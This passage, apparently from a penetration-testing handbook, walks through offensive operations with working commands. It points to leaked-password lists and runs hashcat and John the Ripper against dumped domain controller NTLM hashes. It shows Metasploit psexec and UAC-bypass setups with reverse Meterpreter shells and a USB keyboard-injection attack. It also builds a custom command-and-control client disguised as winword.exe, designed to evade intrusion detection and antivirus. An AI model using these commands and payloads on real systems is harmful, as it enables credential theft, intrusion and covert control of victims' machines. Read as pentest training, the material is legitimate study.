http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2
List Name: Crackstation-human-only
Details: Real human passwords leaked from various website databases. There are about 64 million
passwords in this list. GZIP-compressed. 247 MiB compressed. 684 MiB uncompressed.
Download Link:
https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm
List Name: Crackstation-Full
Details: Full crackstation passwords leaked from various website databases. Extremely large. GZIPcompressed (level 9). 4.2 GiB compressed. 15 GiB uncompressed.
Download Link:
https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm
List Name: m3g9tr0n_Passwords_WordList_CLEANED:
(http://blog.thireus.com/cracking-story-how-i-cracked-over-122-million-sha1-and-md5-hashedpasswords)
Details: List of 122 million passwords
Download Link:
http://bit.ly/KrTcHF
List Name: Ten Million Passwords
Details: A researcher Mark Burnett combined all the recent password dumps and compiled a list of
the top ten million passwords.
Download Link:
https://xato.net/passwords/ten-million-passwords/
‚óè Torrent File: magnet:?
xt=urn:btih:32E50D9656E101F54120ADA3CE73F7A65EC9D5CB&dn=10-millioncombos.zip&tr=udp%3a%2f%2ftracker.leechersparadise.org%3a6969&tr=udp%3a%2f%2ftracker.coppersurfer.tk%3a6969%2fannouncparadise.org%3a6969%2fannounce&tr=http%3a%2f%2fbt.careland.com.cn%3a6969%‚óè To create a unique list of just passwords:
‚óè unzip 10-million-combos.zip
‚óè cut -f2 10-million-combos.txt | sort -u > 10-million-unique.txt
List Name: Wick2o‚Äôs Password List from Dump Monitor
Details: Wick2o monitors leaks on pastebin and similar sites.
Download: git clone https://github.com/wick2o/Dump-Monitor-WordLists.git /opt/Dump-MonitorWordLists
Other places to get passwords or password lists:
‚óè https://github.com/danielmiessler/SecLists/tree/master/Passwords
‚óè https://archive.org/details/pastebinpastes
‚óè https://wiki.skullsecurity.org/Passwords
‚óè http://www.leakedin.com/tag/emailpassword-dump/
‚óè https://www.reddit.com/domain/pastie.org/search?
q=password+leak&sort=relevance&t=month
‚óè Scraping all pastebin/pastie/‚Ä¶ sites
Rules: Rules define if any modifications need be injected into the wordlist. The best way to describe
rules is by an easy-to-follow example. We can take and use the KoreLogicRulesAppendYears
(http://contest-2010.korelogic.com/rules.html) set of rules, which look like the following:
‚óè cAz"19[0-9][0-9]"
‚óè Az"19[0-9][0-9]"
‚óè cAz"20[01][0-9]"
‚óè Az"20[01][0-9]"
It will append the years from 1949 to 2019 in each and every password. If the password list
contained the word "hacker", it would try to crack the hash for the string hacker1949 all the way to
hacker2019. Remember, the more complex rules you have, the more time it will take to finish going
through all the different words in the word list.
Hash Algorithms: A hashing algorithm is used to generate the password hash. These are very
important because if you select the wrong algorithm, it will either fail to run or fail to crack. For
example, if we select the MD5 algorithm for SHA1 hashes, the cracking tools will not find any hashes
to crack and will exit immediately.
Now that we have basic understanding of different cracking configurations, let's compare John the
Ripper versus oclHashcat.
John The Ripper
(http://www.openwall.com/john/) (Windows/Kali Linux/OS X):
I used to regularly use John the Ripper (JtR) but moved away from it a while ago due to the GPUsupport from oclHashcat. However, JtR Jumbo does have CUDA and OpenCLsupport now. Here is a
list of JtR hash formats to help you identify which type of password you are cracking:
http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats.
Cracking MD5 Hashes
Let's say you are able to compromise a *nix system or maybe a database full of password hashes. You
will most likely run into MD5 or SHA hashes, but for the following example, we will assume that
they are non-salted MD5 hashes. If you are looking to crack standard MD5 hashes, the basic
command is:
‚óè john -format=raw-md5 -pot=./list.pot md5list.txt
This will tell john the ripper to look in the md5list.txt file for MD5 hashes and write any cracked
passwords into the file list.pot.
root@kali:~# john --format=raw-md5 --pot=./list.pot md5list.txt
Loaded 3 password hashes with no different salts (Raw MD5 [128/128 SSE2])
test (test)
password (user)
woot (hacker)
guesses: 3 time: 0:00:00:01 DONE (Sun Dec 29 18:32:12 2013)
If you are using the JtR Jumbo pack and want to take advantage of GPU processing:
‚óè john --format=raw-md5-opencl --wordlist=./Wordlists/all.lst --rules: Single
md5list.txt
Here are additional sources on using JtR: http://blog.thireus.com/cracking-story-how-i-cracked-over122-million-sha1-and-md5-hashed-passwords.
OclHashcat
(http://hashcat.net/oclhashcat/)(Windows/Kali Linux):
Honestly, this is the tool I use most when password cracking. As we all know, graphic processing
units (GPUs) are great for cracking passwords as they utilize many different cores in parallel. The
advantages of using GPUs vs. CPUs are very significant and this can be demonstrated with the use of
oclHashcat.
In the following examples, I am going to go over cracking WPAv2 and NTLMv2. These are the most
common hash types I run into and they are typically the groundwork for any other types of hashes. If
you want to see all the different hash types that oclHashcat will support, visit their website at
http://hashcat.net/oclhashcat/.
Cracking WPAv2
In the beginning of the book, I discussed how to capture the WPAv2 handshake, which is required for
password cracking. The output from the capture was a .hccap file. This is the file format that
oclHashcat supports for brute forcing WPA-hashed passwords.
In the following examples, I am going to utilize oclHashcat on my Windows host using a GeForce
GTX 680. Generally, I prefer using the ATI Radeon cards, but for this example, it won't make much
of a difference. To kick off the password cracking, I will use the command:
‚óè cudaHashcat-plus64.exe -m 2500 out.hccap list\rockyou.txt
oclHashcat Example
This is a very straightforward example, which says to crack WPAv2 hashes against the out.hccap file
and use the password list from rockyou.txt.
Cracking NTLMv2
If you have compromised a Windows Host or maybe a Domain Controller, you will have to crack
NTLM hashes. You can always try to crack the LM hashes, but they are becoming more and more
difficult to find, so we will stick with the NTLM hashes.
In the following example, we are taking a list of NTLM hashes and using the rockyou password list.
oclHashcat NTLM
From the example above, there were three unique passwords, but oclHashcat was only able to crack
two of the three passwords. To increase our chances, I am going to add the passwordspro rule set to
assist with the rockyou password list. If you want to get a little deeper into understanding these rules,
try starting at the oclHashcat page:
http://hashcat.net/wiki/doku.php?id=rule_based_attack.
oclHashcat with Rules
Using the rules didn't actually find the password for the third hash. In larger password hash lists, this
would have definitely found more passwords, but was only able to find two out of the three
passwords in this scenario.
To increase our chances even more, I will try a much larger password list. This, of course, increases
the amount of time needed to run this job. However, if it resolves a password, it will be worth it. The
command to use is:
‚óè cudaHashcat-plus64.exe -m 1000 NTLM.txt list\realhuman.txt -r
rules\passwordspro.rule
oclHashcat with Different Password List
As you can see from the results, the new password list and rule set recovered the third password. Just
by playing around with different password lists and rule sets, you can quickly find out what works
and what just takes too long to run. This is all based on what types of GPUs you have, how long the
password lists are, and the complexity of your rule set.
Whether you want to crack MD5 hashes, MSSQL hashes, SHA1 hashes, or others, this same query
can be run by changing the "-m" parameter. For a full listing of hashes that oclHashcat accepts and
cracks, go to:
https://hashcat.net/wiki/doku.php?id=example_hashes.
Cracking in Real Life
You were able to successfully dump the Domain Controller. The next step is to see what you are able
to recover. Historically there were Rainbow tables, but with minimum length restrictions, size and
time became a huge issue. Trying to create Rainbow tables for 10+ characters becomes so expensive
that it isn‚Äôt really usable on a penetration test (unless you find LM hashes).
oclHashcat is the fastest password recovery tool that I have ever dealt with. I have used John the
Ripper and other tools, but due to the use of GPUs, rules, pre-processing, and password lists, I
generally turn to oclHashcat as my go-to password-cracking tool. This chapter will talk about how to
effectively use oclHashcat in a pentest and will mostly focus on cracking NTLM hashes; however,
you can use these examples with any hashes.
My password cracking rig was presented in the Pre-Game phase and with a little bit of money, you
can be running your own password cracking monster.
So, you were able to extract the SUCK Domain Controller hashes. The next step is to be able to see
what you can recover from those hashes. In our example, we are using a password dump similar to
what I have seen in the field. Our compromised DC has a list of over 21,000 hashes. We could first
start by straight brute forcing through all the characters, but is this really feasible? Let‚Äôs see by
running the command:
‚óè oclHashcat64.exe -m 1000 hashes\hashes.lst -a 3 ?a?a?a?a?a?a?a?a --force
Command Breakdown:
‚óè oclHashcat Executable: oclHashcat64.exe
‚óè -m 1000: The hashes we are supplying are in the format of NTLM
‚óè hashes\hashes.list: Stored location of the Domain Controller Hashes
‚óè -a 3: using brute-force Attack mode (using a mask below)
‚óè ?a?a?a?a?a?a?a?a: 8 combination of letters, numbers and special (upper/lower
case) characters
This definitely isn‚Äôt the most efficient way to crack hashes, but it can really cover those odd
passwords like Jdkl!3vG that might not be in a password list. Masks will be very important to learn,
so if you haven‚Äôt dealt with them before, make sure to check out oclHashcat‚Äôs site:
https://hashcat.net/wiki/doku.php?id=mask_attack.
Remember that we are going for speed and efficiency on a test, so let‚Äôs see what results the bruteforce attack will provide:
oclHashcat Brute-Force
We can already see that this is going to take four days to go through all eight characters. We could use
smarter masks based on human tendencies. We know that if there are password requirements, such as
upper/lower/special character, most people put the capital letter in the front, the special character at
the end. We could create these custom masks to better improve efficiency, but this will still take a fair
amount of time.
For efficiency sake, the next best step is to start testing large password hashes. We are going to focus
on using two different password lists: Crackstation and m3g9tr0n_Passwords. It is important for you
to find out which password lists work well in various industries. Let‚Äôs start with the Crackstation list,
which contains roughly 64 million passwords:
‚óè oclHashcat64.exe -m 1000 hashes\hashes.lst lists\crackstation_realhuman_phill.txt -
-force
The results below on the left show that in six seconds, we were able to test all the hashes against the
password list. Using the Radeon R9 295x2, we are able to get some great speed against these lists.
Unfortunately, the results from these hashes are pretty low with 780 or about 3.66% passwords
recovered.
The next step is to run the hashes against rules. Luckily, oclHashcat has provided a list of great rules
to run. They are located inside the oclHashcat directory, in the rules folder. I recommend going
through each of them and understanding what the differences are between the rules. In the next
example, we are going to use the same password list and, this time, incorporate a great rule set:
‚óè oclHashcat64.exe -m 1000 hashes\hashes.lst lists\crackstation_realhuman_phill.txt -
r rules\InsidePro-PasswordsPro.rule --force
oclHashcat ‚Äì Wordlist Cracking
oclHashcat - Wordlist Cracking
In the image above on the right, by the using rules, we are processing about 7 million hashes a second,
which took about 40 seconds. Still well within our time limit, we have now cracked 38% or 8180
hashes. This is now looking positive. Let‚Äôs throw another password list at it this time. From the prep
stages, we should have the eNtr0pY_ALL_sort_uniq.dic that we can use:
‚óè oclHashcat64.exe -m 1000 hashes\hashes.lst lists\eNtr0pY_ALL_sort_uniq.dic -r
rules\InsidePro-PasswordsPro.rule --force
oclHashcat - Adding Rules
This took about the same amount of time for 122 million passwords, but we were able to go from38% up to 50% of recovered hashes in under a few minutes total.
We can keep playing around with additional rules and make small gains, but at some point the rules
will stop making a difference. We need to find new words to add to our password list.
‚óè oclHashcat64.exe -m 1000 hashes\hashes.lst lists\eNtr0pY_ALL_sort_uniq.dic -r
rules\InsidePro-HashManager.rule ‚Äìforce
oclHashcat - Additional Password Lists
Back in the prep stages, we created some custom password lists using two tools, Wolfhound (for
words from Twitter/Reddit/Websites) and the custom webscraping tool. Let‚Äôs take those lists and run
some additional cracks against them:
‚óè oclHashcat64.exe -m 1000 hashes\hashes.lst lists\10k_and_scraped_passwords.txt -
r rules\InsidePro-PasswordsPro.rule --force
oclHashcat - Custom Password Lists
We now are at 55% of passwords cracked, but still have a long way to go.
Prince:
Prince is a password guess generator and can be thought of as an advanced Combinator attack. Rather
than taking input from two different dictionaries and outputting all the possible two-word
combinations, Prince only has one input dictionary and builds "chains" of combined words
(http://reusablesec.blogspot.com/2014/12/tool-deep-dive-prince.html). Prince was introduced in late
2014 to advance the attacks on password guessing. As more and more people started using complex
passwords, following the example set by this xkcd comic strip, http://xkcd.com/936/, it became
harder to password guess.
What Prince does is take a password list and generates all the different combinations it can. If you
have a list with:
‚óè a
‚óè cat
‚óè house
It will build a list of passwords:
‚óè acat
‚óè ahouse
‚óè acathouse
‚óè ahousecat
‚óè cata
‚óè cathouse
‚óè catahouse
‚óè cathousea
‚óè ‚Ä¶ and so on.
Using this technique, we can take some of our favorite password lists and generate great password
combination lists. We will start with a small list of passwords, add our custom words and start
building from there. In this case, I used the following password list, which had a good number of
basic passwords:
‚óè https://raw.githubusercontent.com/discourse/discourse/master/lib/common_passwordcommon-passwords.txt
Next, I added the words scraped from the Bloodhound and Webscraper examples. In total, I have
about 15,000 words to create these different password lists. For example:
‚óè princeprocessor-0.19\pp64.exe --pw-min=9 --pw-max=10 -o pp.txt <
lists\10k_and_scraped_passwords.txt
Command Breakdown:
‚óè princeprocessor Executable: pp64.exe
‚óè --pw-min=9: Minimum password length of 9 characters
‚óè --pw-min=10: Minimum password length of 10 characters
‚óè -o pp.txt: Output to a file called pp.txt
‚óè < lists\10k_and_scraped_passwords.txt: List of 10k wordlist and scraped words
‚óè *One additional optional flag is to use --elem-cnt-max=NUM. This defines how
many words can be put together to make a chain.
The output of pp.txt is about 272 MB. If we take a look at the files, we see the combined wordlists.
Prince - Password Generator
As we see from the pp.txt file above, there are words that we would never have had in our original
password list. What if we create a file with passwords sized between 10-12 characters?
‚óè princeprocessor-0.19\pp64.exe --pw-min=10 --pw-max=12 -o pp10_12.txt <
lists\10k_and_scraped_passwords.txt
The new file size is now 61GB. This shows that the file sizes grow exponentially and can get
extremely large very quickly. What if we run the 10-12 character Prince-generated wordlist against
our DC hash dump?
‚óè oclHashcat64.exe -m 1000 hashes\hashes.lst pp10_12.txt -r rules\InsideProHashManager.rule --force
Prince - Password Cracking
The hash output recovery went from 11790 to 11920 in 43 minutes. Although these aren‚Äôt significant
gains, these could be the passwords that we really care about. One interesting note is that on a lot of
different pentests, I have noticed that users who have extremely long passwords usually have higher
privileges. Usually, someone in the IT or Security groups will with the most permissions.
The last example is that we can actually pipe the results from Prince processor straight into
oclHashcat. Let‚Äôs look for words between 13 and 14 characters and run the InsidePro-HashManager
rule against those words.
‚óè princeprocessor-0.19\pp64.exe --pw-min=13 --pw-max=14 <
lists\10k_and_scraped_passwords.txt | oclHashcat64.exe -m 1000 hashes\hashes.lst -r
rules\InsidePro-HashManager.rule ‚Äìforce
Prince - Modifications
After about 40 minutes, we have gone past the 56% rate. So in the total of 2 hours, we have cracked
about 12,000 out of the 21,000 password hashes using all open source and readily available
information. Taking it to the next step would be to focus on the targeted employees, pull additional
password dumps, and lastly start brute forcing.
C:\oclHashcat-1.32>.\hashcat-utils-1.1\morph.exe lists\crackstat_realhuman_phill.txt 20 3 3 12 >
testrule.txt
C:\oclHashcat-1.32>oclHashcat64.exe -m 1000 hashes\hashes.lst lists\crackstat_realhuman_phill.txt -
r testrule.txt --force
Morph Example
Now, we are going to go against the large crackstation password list.
‚óè oclHashcat64.exe -m 1000 hashes\hashes.lst
\Users\cheetz\Desktop\Kali_Share\realuniq.lst -r rules\rockyou-30000.rule --force
oclHashcat - Results
After about four hours of cracking, we are almost at 70%. This is just a start on how I approach
password cracking. Usually, I will go after more custom passwords and try more complex rules to get
to that 90%+.
Retesting Passwords: What if after a test, they change all their passwords? What if we increment
their old password by a value of 1?
‚óè oclHashcat64.exe -m 1000 hashes\hashes.lst --show > password_list.txt
‚óè type password_list
‚óè test1:509019:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e7‚óè test3:498809:aad3b435b51404eeaad3b435b51404ee:523971d356ffcaaa96cfb69597a‚óè test4:496638:aad3b435b51404eeaad3b435b51404ee:4636190bde3bb52ad2d29ca37‚óè test5:520315:aad3b435b51404eeaad3b435b51404ee:b8ffa37b7c490aaf0e5661fad39
There have been penetration tests where I compromised a domain and was successful in
pulling/cracking hashes. The client patched all the findings, reset all the passwords of those users,
and asked for a remediation test.
After testing and validating that everything was fixed, I took it one step further. I wanted to make sure
that the users didn‚Äôt just change their password by incrementing by one. We have seen a ton of
password breaches and leaks in the past and we want to make sure that users are smarter than just
incrementing by a single number.
I have developed Password Plus One that takes the output from oclHashcat and regardless of special
characters, increases the last integer by one. For example, if the passwords is i<3turtles09, the new
password generated is i<3turtles10.
If we take our last output and we read the hashes, it will look something like:
root@kali:/opt/Password_Plus_One# cat /mnt/hgfs/oclHashcat-1.32/password_list.txt
‚óè jsmith:1::64f12cddaa88057e06a81b54e73b949b::::Password1
‚óè plee:2::f9671733342b19ec0753bd34892cc4c3::::Nina2014
‚óè ssmith:3::176b4c6fbb0a54cd5a693b57fe887465::::i<3turtles09
‚óè jwatts:5::9f00b7969b887b7e21a736c09328d083::::TodayisToday
‚óè bjones:6::d3b4e97bb637cd629ef5b9f5d7bd5064::::Toneth2$
We want to run password_plus_one on our large password list:
‚óè cd /opt/Password_Plus_One
‚óè python ./password_plus_one.py
‚óã Enter the location of the oclHashcat output
‚óã A new file will be created with a list of Usernames/New Passwords
to new_password_list.txt
P+1 - Password Modification
Now, you can feed this into a bruteforcer for web applications, SSH, or even Outlook Web
Application (OWA). On decent sized clients, this attack usually leads back into multiple accounts and
into the company.
Vulnerability Searching
A huge part about being a pentester is being able to find vulnerabilities in applications and services.
From the Nmap scans, vulnerability scans, and from poking around, you will identify all sorts of
versions for these applications and services.
Generally, I will take the results from Nmap banners and the vulnerability scanner and query the
identified versions of the applications against the following sites/tools to find exploits:
Searchsploit (Kali Linux)
Searchsploit is a default query tool that will search through publicly known exploits based on a
search string you provide. You can provide part of the title or application to find an exploit. There
are a good number of exploits here and most of them have code or scripts ready to run. One thing I
want to strongly urge is to make sure that you test them in a lab environment before testing them on
production systems.
On your Kali host, run searchsploit.
Searchsploit
For this example, let's say I found a Joomla site and I want to see if there are any vulnerabilities for
this application. To query searchsploit, I will craft a query like:
searchsploit joomla.
Searchsploit Results
Just from a quick query for Joomla, we currently have 906 different vulnerabilities. Let's take a look
at one of them to get an idea of what it looks like. One thing to note is that the paths in the results are
pathed improperly. All searchsploit files are located under /usr/share/exploitdb/. To view the
vulnerability or exploit code, type the following:
cat /usr/share/exploitdb/platforms/php/webapps/22153.pl
22153 PerlJoomla Exploit Example
The 22153.pl is a Perl script to perform an SQL injection against a certain version of Joomla. If
successful, the Perl script will return the password of the administrator.
Bugtraq
(http://www.securityfocus.com/bid)
Security Focus‚Äôs BugTraq is an excellent source for finding vulnerabilities and exploits. You can
search vulnerabilities by CVEs or by vendor/product types at: http://www.securityfocus.com/bid.
In the example below, I was looking for some Adobe ColdFusion exploits and seemed to have found
quite a few.
BugTraq
Exploit-db
(http://www.exploit-db.com/)
This site has definitely grown and I really see this site as the replacement of the good ol' milw0rm.
Many researches will post their exploits and research to Exploit-DB, which is completely
searchable. I recommend that you spend some time on Exploit-DB as it is a great resource.
Exploit-DB
Querying Metasploit
You can't forget Metasploit as a great resource for finding vulnerabilities.
‚óè On your Kali host, in a terminal type: msfconsole
‚óè And to find an exploit or auxiliary module, type: search [what you want to find]
In the following example, I search for all ColdFusion modules.
Search Metasploit
Tips and Tricks
This section is dedicated to things that didn't really have a place in the other sections, but might be
able to make your job much easier.
RC Scripts Within Metasploit
Since I try to encourage efficiency, some scripts that you should look into are Metasploit's resource
(RC) scripts. These scripts can be created to help speed up common tasks you might perform. For this
example, I am creating a script to use the PSExec module, use smart_migrate to migrate the
Meterpreter process into another PID, and set all the fill-in other information required for the attack.
We will save the following code to demo.rc:
‚óè use exploit/windows/smb/psexec
‚óè set rhost 192.168.10.10
‚óè set smbuser Administrator
‚óè set smbpass ________________hash_____________ or password
‚óè set smbdomain ____domain_____
‚óè set payload windows/meterpreter/reverse_tcp
‚óè set AutoRunScript post/windows/manage/smart_migrate
‚óè setg lport 443
‚óè setg lhost 192.168.10.3
To run the script, from a shell prompt enter:
‚óè msfconsole -r /root/demo.rc
RC Scripts
All you have to do after it loads is type: exploit. This script starts up Metasploit, authenticates to
192.168.10.10 using PSExec, drops and executes the Meterpreter payload, and connects that box back
to your host to gain a full Meterpreter shell.
This is a much faster way to prepare your scripts, exploits, and especially handlers. I like to add
features like auto-migrate or add custom payloads to exploits.
Windows Sniffer
There might be times where you might need to start a sniffer on the host system. This can be done on
any Win7 or higher OS with Administrative Privileges, without any additional software.{47}{48}
‚óè netsh trace start capture=yes overwrite=no tracefile=C:\Users\Public\sniff.etl
‚óè netsh trace stop
To convert the etl file to something we can view in Wireshark (.cap file), we have to do the
following:
‚óè On Win 8, first install Message Analyzer:
‚óã http://www.microsoft.com/en-us/download/details.aspx?id=44226
‚óè Run the command:
‚óã powershell -exec bypass command "import-module PEF; $s = NewPefTraceSession -Path 'C:\Users\Public\OutFile.Cap' -SaveOnStop; $s
| Add-PefMessageProvider -Provider 'C:\Users\Public\sniff.etl' ; $s |
Start-PefTraceSession"
The output will be located in C:\Users\Public\OutFile.Cap, where you can just open this file in
WireShark. Remember that by default, it only captures 250MB, so if you need more space, specify the
MaxSize=<Size> switch.
So, what do you do after you capture a lot of different network traffic? You need to parse through it.
We are going to use a tool called net-creds developed by Dan McInerney. Net-creds is a tool that
sniffs passwords and hashes from a pcap file. It will include URLs, username/passwords in cleartext,
SNMP, SMTP, NTLM, and Kerberos. Since this tool only takes in pcap files, it is important to first
convert your cap file to a pcap file. I usually do this by loading the cap file into Wireshark and saving
it back as a pcap. Once we have a pcap file, we can run the following commands:
‚óè cd /opt/net-creds
‚óè python net-creds.py -p [pcap file]
root@kali:/opt/net-creds# python net-creds.py -p OutFile.pcap
[192.168.1.85] GET next-services.apps.microsoft.com/
[192.168.1.85:49764 > 192.168.210.76:21] FTP User: hacker
[192.168.1.85:49764 > 192.168.210.76:21] FTP Pass: password
[192.168.210.76:21 > 192.168.1.85:49764] Authentication: authentication successful
[192.168.1.85:51234 > 192.168.210.76:445] NETNTLMv2: lab::hacker.testlab:11223344‚Ä¶
Bypass UAC
There are times when you might have an administrative account and a Meterpreter session, but you
can't become system by using the "getsystem" command. This is most likely because User Account
Control (UAC) protection is blocking you from running the getsystem command.
In the past and in the previous book, we used either a custom upload of bypassUAC from David
Kennedy or used the metasploit module bypassuac. The issue was that it had to drop an executable,
which would generally spawn a second file as well. I have often seen instances where AV would
pick up either one of the two files.
To get around this, I migrated from using bypassuac to using bypassusac_injection. This module uses
the Reflective DLL Injection technique to drop only the DLL payload binary instead of the three
separate binaries in the standard technique. The reason I switched is because I have had better luck
evading AV using DLL versus executables. If you need to use a custom DLL, you can always set
EXE::Custom to your DLL. Let‚Äôs walk through an example where you need to get to system quick.
You might see something like this:
‚óè msf exploit(bypassuac_injection) > sessions -i 1
‚óè [*] Starting interaction with 1...
‚óè meterpreter > getsystem
‚óè [-] priv_elevate_getsystem: Operation failed: The environment is incorrect.
If you do have an administrative account, most likely UAC is blocking execution, which is enabled by
default. To get around this, you will need to background the current Meterpreter process, use the
bypassuac_injection module, set your options, and run it:
‚óè meterpreter > background
‚óè [*] Backgrounding session 1...
‚óè msf exploit(bypassuac_injection) > use exploit/windows/local/bypassuac_injection
‚óè msf exploit(bypassuac_injection) > set target 1
‚óè target => 1
‚óè msf exploit(bypassuac_injection) > set PAYLOAD
windows/x64/meterpreter/reverse_https
‚óè PAYLOAD => windows/x64/meterpreter/reverse_https
‚óè msf exploit(bypassuac_injection) > exploit
Note that if you are targeting a x64 host, you need to make sure to set the PAYLOAD to a 64bit
payload and set the target to ‚Äú1‚Äù which is a Windows 64bit OS.
BypassUAC
Now, you can do hashdumps, mimikatz, or any other command that requires system privileges.
Kali Linux Nethunter
Every so often, I need to do a little penetration testing on the go. A great portable solution for this is
Kali Linux NetHunter.
‚ÄúThe Kali Linux NetHunter project is the first Open Source Android penetration testing platform for
Nexus devices, created as a joint effort between the Kali community member ‚ÄúBinkyBear‚Äù and
Offensive Security. NetHunter supports Wireless 802.11 frame injection, one-click MANA Evil
Access Point setups, HID keyboard (Teensy-like attacks), as well as BadUSB MITM attacks.‚Äù{49}
Out of the box, NetHunter works pretty easily with Nexus 5, Nexus 7, or Nexus 10. To install,
download the NetHunter Installer from:
https://www.offensive-security.com/kali-linux-nethunter-download/,
Run the executable, and follow the install instructions.
Installing NetHunter
Installation is pretty straightforward and once you have it all configured, NetHunter is ready to go.
Going to the tablet, you will be brought to the screen below. To start using NetHunter, drop into the
NetHunter App.
Nethunter Start Screen
If we drop into the ‚ÄúLaunch Kali Shell in Terminal‚Äù we can type ‚Äúmsfconsole‚Äù and drop straight into
Metasploit. NetHunter has a lot of abilities, such as attacking WIFI networks, setting up access points,
malicious DNS servers, and more.
Nethunter - Metasploit
One of the attacks is similar to the Rubber Ducky attack. This attack is called the ‚ÄúHID Keyboard
Attack‚Äù and allows the Nexus device to emulate a keyboard and press keystrokes onto the machine
once it is plugged into a computer. To access the HID tool, on the top-left menu, we can drop to ‚ÄúHID
Keyboard Attack.‚Äù
Nethunter HID Attack
You might have to configure the UAC Bypass and once the device is plugged into a computer, just hit
execute. The great part about this tool is that it is flexible, easy to configure, and quick to use. You
might be on a physical engagement, where you are walking around the office. You see someone leave
their workstation unlocked to leave for lunch. You don‚Äôt want to be sitting there typing commands on
their machine. Instead, you might be able to plug your NetHunter device into a USB port and hit
execute. You wait as it calls a PowerShell Meterpreter script and creates a reverse shell. Another use
for something like the HID Keyboard Attack is with kiosks. I have seen plenty of kiosks that either
have a limited physical/virtual keyboard, or no keyboard at all, but have USB ports. This is a great
attack for just that.
Building A Custom Reverse Shell
I did a presentation at one of the LETHAL meetings about problems we sometimes encounter on
engagements. As we run into more and more complex firewalls, we need to look at things differently.
One thing I started seeing is application-based firewalls. The idea behind this is that the firewall
looks at the packets to see if they are communicating the proper protocols on the proper ports. So, you
can‚Äôt run SSH on web ports (80/443) and the company does full ‚Äúman in the middle‚Äù SSL proxying.
Therefore, not only do we need to look like the protocols that are specific on ports, but we also need
to evade any sort of IDS. When I teach, I love to give the doomsday scenario. Let‚Äôs say Metasploit no
longer works, you have full SSL interception, and IDS work great. What can you do?
I started building a framework exactly for this. What were my requirements?
‚óè Bypass application-based firewalls
‚óè Make everything seem normal to an analyst
‚óè Be able to have full control of the host
‚óè Be able to upload/download files
‚óè Make penetration testing faster
‚óè Generate client executables and evade AV
I built and implemented the communication protocol first. From there, I can build all the modules. The
implementation targeted the following:
‚óè Take the Top 500 Words
‚óè Any C2 communication between client and server
‚óã Get gzip for compression
‚óã Get base64 encoded for standard characters
‚óã Each letter is converted to a word
‚óè Make sure traffic looks random
‚óã The same cmd command doesn‚Äôt look the same (cmd != cmd)
‚óã Can‚Äôt build standard IDS signatures
‚óè Utilize system commands (PowerShell, WMI)
‚óè Python/pyinstaller
Let‚Äôs walk through an example. Let‚Äôs say we want to send a ‚Äúcmd ipconfig‚Äù command to get the IP of
the host:
Now that we have a base64 encoded string (eJxLzk1RyCxIzs9Ly0wHAB1fBKQ) and a key of 20, we
can generate obfuscated packets:
Server Implementation:
The other requirement was to bypass application based firewalls. To do this, we need to not only
communicate over a web port, but we need it to look like web traffic.
Now that we have an understanding of how the clients will communicate to our server, let‚Äôs walk
through the Proof of Concept (PoC). First install the c2 code and create a malicious binary. *Make
sure to have SMBExec and Veil-Framework installed. These tools will install all the dependencies.
‚óè git clone https://github.com/cheetz/c2 /opt/c2/
‚óè cd /opt/c2/
‚óè chmod +x setup.sh
‚óè ./setup.sh
‚óè python ./server.py
‚óè help
‚óè generate_binary [ip] [port]
Custom C2 - Building a Payload
We have generated a binary and it is saved to /opt/c2/dist/winword.exe. This is a python file turned
into an executable that will communicate back to our server. We can now take that executable and
move it to our victim system and run it.
Once a victim has executed the client, you will see the hostname show up on the C2 server. We can
run a quick help to see what we can do. One example is the info [host] command. If we run info win7,
we see the all the host information, such as user and system info, permissions, network information,
netstat, and open shares.
Custom C2 - Post Exploitation
I also incorporated a ton of the standard post execution commands. Although Metasploit and
Meterpreter are amazing tools, sometimes it is hard to know exactly what to do next. That is why I
created the post section specifically for Windows. It will do all the standard Windows Post
exploitation, such as list patches, list users, list all AD accounts in active directory, pull passwords
with Mimikatz, bypassUAC, and popcreds. Just type ‚Äúpost‚Äù on the server and interact with:
‚óè post win7 password64
‚óè This will execute mimikatz on the end host and pull hashes.
Custom C2 - BypassUAC and Mimikatz
You also have the ability to run commands on the end host with cmd [hostname] ‚Äúcommand‚Äù. More
importantly than running these commands is: ‚ÄúWhat does the traffic look like?‚Äù Next, let‚Äôs look in
Wireshark to view the TCP stream when we pull hashes in the next example.
Custom C2 - TCP Stream Using Words
As you can see, the client sent what looks to be a very badly constructed sentence and the response
from the nginx C2 server (not really nginx but python) is a long run-on mix of words. Whether you are
sending your victim‚Äôs files or commands, they will all follow the same structure.
Think about this for a second: If you are monitoring the network or configuring an IDS, how do you
detect this type of traffic? Unless you are reading line by line, the traffic looks just like normal web
traffic. There are no patterns or special characters, and the sentences actually look like sentences (but
don‚Äôt make sense of course). You could be on this host all day long and never be detected. This is just
a PoC, which was developed for a specific penetration test. I recommend you take the code and
expand on it or build your own.
Evading Application Based Firewalls
We are seeing more and more UTM based firewalls that perform Application Level Filtering.
Meaning, if you aren‚Äôt the right protocol for the defined port, you are going to be denied, which will
trigger the alert.
Building a communication tunnel yourself would be a great exercise for any pentester. Luckily, David
Kennedy has already done the work for you.(50)(51) I forked a copy from David‚Äôs Github; however, I
did have to make one change. On line 108, I commented out the ‚Äúbreak‚Äù in his code.
Installation and configuration:
‚óè git clone https://github.com/cheetz/meterssh /opt/meterssh
‚óè cd /opt/meterssh
‚óè gedit meterssh.py
‚óè At the bottom modify the following:
‚óè user = "sshuser"
‚óè password = "sshpw"
‚óè rhost = "192.168.1.1"
‚óè port = "22"
Make sure Veil-Evasion is installed as it takes care of many of the dependencies. It takes a little work
to get everything configured since we need to start the SSH service and install some dependencies:
‚óè service ssh start
‚óè git clone https://github.com/warner/python-ecdsa.git /opt/python-ecdsa
‚óè cd /opt/python-ecdsa/ && wine C:/Python27/python.exe ./setup.py install
‚óè git clone https://github.com/paramiko/paramiko.git /opt/paramiko
‚óè cd /opt/paramiko/ && wine C:/Python27/python.exe ./setup.py install
‚óè git clone https://github.com/pyinstaller/pyinstaller.git /opt/pyinstaller
‚óè cd /opt/pyinstaller/ && wine C:/Python27/python.exe /opt/pyinstaller/setup.py
install
‚óè cd /opt/ && wget https://pypi.python.org/packages/source/P/PyInstaller/PyInstaller2.1.zip#md5=3eb18a454311707ab7808d881e677329 && unzip PyInstaller-2.1.zip
‚óè cd /opt/meterssh/
‚óè wine C:/Python27/python.exe /opt/Pyinstaller-2.1/pyinstaller.py --noconsole --
onefile meterssh.py
After it successfully completes, you should have a new Windows Executable located at
